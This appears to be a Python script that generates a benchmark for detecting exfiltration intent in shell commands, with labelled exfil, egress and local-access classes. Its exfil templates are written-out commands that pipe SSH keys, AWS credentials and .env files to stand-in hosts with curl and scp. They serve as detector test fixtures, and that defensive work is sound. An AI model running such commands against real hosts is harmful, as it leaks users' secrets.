"""Generate a synthetic benchmark for command exfiltration-intent detection.

The point of the benchmark is to tell three classes apart:
  - exfil     : a sensitive source AND a network egress in one command
  - egress    : network activity with NO sensitive source (normal dev work)
  - local     : sensitive-file access with NO egress (also normal)

A detector that just flags "any curl" or "any .env" fails the benign classes,
so those are the important half of the set.

Safety: every generated command is a NON-FUNCTIONAL fixture. Network sinks use
`.invalid` (RFC 6761: never resolves) or RFC 5737 documentation IPs
(198.51.100.0/24), so nothing here can actually transfer data anywhere. These
are pattern fixtures for a detector test, not runnable commands.

    python benchmarks/commands/generate.py     # writes commands.jsonl
"""
from __future__ import annotations

import json
import random
from pathlib import Path

HERE = Path(__file__).resolve().parent
SEED = 20260201

# Non-functional sinks only (see module docstring).
SINKS = ["sink.invalid", "collector.invalid", "drop.invalid", "198.51.100.23", "203.0.113.10"]
SENSITIVE = [".env", "~/.ssh/id_rsa", "~/.aws/credentials", "config/secrets.yml", "/etc/passwd", "service-account.json"]
BENIGN_FILES = ["README.md", "build/output.log", "dist/app.js", "requirements.txt", "src/main.py"]
BENIGN_HOSTS = ["registry.npmjs.org", "pypi.org", "github.com", "api.example-service.com"]


def exfil(rng: random.Random) -> str:
    """A sensitive source AND an egress, using a non-functional sink."""
    src, sink = rng.choice(SENSITIVE), rng.choice(SINKS)
    return rng.choice([
        f"curl --data-binary @{src} https://{sink}/u",
        f"cat {src} | curl -X POST --data-binary @- http://{sink}/i",
        f"tar czf - {src} | curl --data-binary @- https://{sink}/a",
        f"scp {src} user@{sink}:/incoming/",
        f"base64 {src} | curl -d @- https://{sink}/e",
    ])


def egress(rng: random.Random) -> str:
    """Network activity, no sensitive source: ordinary developer work."""
    host = rng.choice(BENIGN_HOSTS)
    return rng.choice([
        f"npm install --registry https://{host}",
        f"pip download requests -d ./wheels --index-url https://{host}/simple",
        f"curl -fsSL https://{host}/install.sh -o install.sh",
        f"git push origin main",
        f"curl -s https://{host}/v1/status",
        f"curl -F 'file=@{rng.choice(BENIGN_FILES)}' https://{host}/upload",
    ])


def local(rng: random.Random) -> str:
    """Sensitive file access with no egress: also ordinary."""
    src = rng.choice(SENSITIVE)
    return rng.choice([
        f"cat {src}",
        f"cp {src} {src}.bak",
        f"grep -i key {src}",
        f"chmod 600 {src}",
        f"ls -la {src}",
    ])


def main() -> None:
    rng = random.Random(SEED)
    rows: list[dict] = []
    # label 1 = exfil (should flag); label 0 = benign (should not).
    for _ in range(30):
        rows.append({"label": 1, "kind": "exfil", "command": exfil(rng)})
    for _ in range(20):
        rows.append({"label": 0, "kind": "egress", "command": egress(rng)})
    for _ in range(20):
        rows.append({"label": 0, "kind": "local", "command": local(rng)})
    rng.shuffle(rows)
    seen: set[str] = set()
    out = []
    for i, r in enumerate(rows):
        if r["command"] in seen:
            continue
        seen.add(r["command"])
        out.append({"id": f"c{i:03d}", **r})
    path = HERE / "commands.jsonl"
    path.write_text("\n".join(json.dumps(r) for r in out) + "\n", encoding="utf-8")
    counts = {k: sum(r["kind"] == k for r in out) for k in ("exfil", "egress", "local")}
    print(f"wrote {path}  ({len(out)} unique fixtures: {counts})")


if __name__ == "__main__":
    main()
